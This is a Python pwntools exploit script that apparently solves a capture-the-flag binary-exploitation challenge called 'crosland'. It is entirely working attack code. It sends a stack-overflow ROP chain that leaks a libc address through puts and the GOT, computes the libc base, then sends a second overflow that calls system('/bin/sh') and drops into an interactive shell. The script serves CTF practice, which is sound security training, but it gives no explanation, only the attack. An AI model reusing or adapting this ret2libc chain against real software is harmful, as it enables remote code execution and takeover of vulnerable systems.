from pwn import *
import sys

context.clear(arch='amd64')
context.terminal = ["konsole", "-e"]

binary = "./crosland"
if "remote" in sys.argv:
    sh = remote("challs.wreckctf.com", 31789)
    libc = ELF("./remote_libc")
else:
    sh = process(binary)
    libc = ELF("./local_libc")
    if "gdb" in sys.argv:
        gdb.attach(sh, gdbscript="""
            break *main+79
            continue
        """)


elf = ELF(binary)
rop = ROP(binary)

libc_setbuf = libc.symbols["setbuf"]
print(f"LIBC setbuf @ {hex(libc_setbuf)}")
libc_binsh = next(libc.search(b"/bin/sh"))
print(f"LIBC binsh @ {hex(libc_binsh)}")
nop_ret = 0x00000000004010ef

# leak libc setbuf
sh.recvuntil(b"?")
payload = b"A"*0x48
payload += p64(rop.rdi.address)
payload += p64(elf.got['setbuf'])
payload += p64(elf.symbols["puts"])
payload += p64(elf.symbols["main"])
sh.sendline(payload)


sh.recvline()  # eat luck
sh.recvline()

leak_setbuf = u64(sh.recvline().strip().ljust(8, b"\x00"))
print(f"LIBC setbuf @ {hex(leak_setbuf)}")

libc_base = leak_setbuf-libc_setbuf
print(f"LIBC base @ {hex(libc_base)}")
libc_system = libc_base + libc.symbols["system"]
libc_binsh = libc_base + libc_binsh
print(f"LIBC system @ {hex(libc_system)}")
print(f"LIBC binsh @ {hex(libc_binsh)}")

# call system
sh.recvuntil(b"?")
payload = b"A"*0x48
payload += p64(nop_ret)
payload += p64(rop.rdi.address)
payload += p64(libc_binsh)
payload += p64(libc_base + libc.symbols["system"])
payload += p64(libc_base + libc.symbols["exit"])
sh.sendline(payload)

sh.interactive()
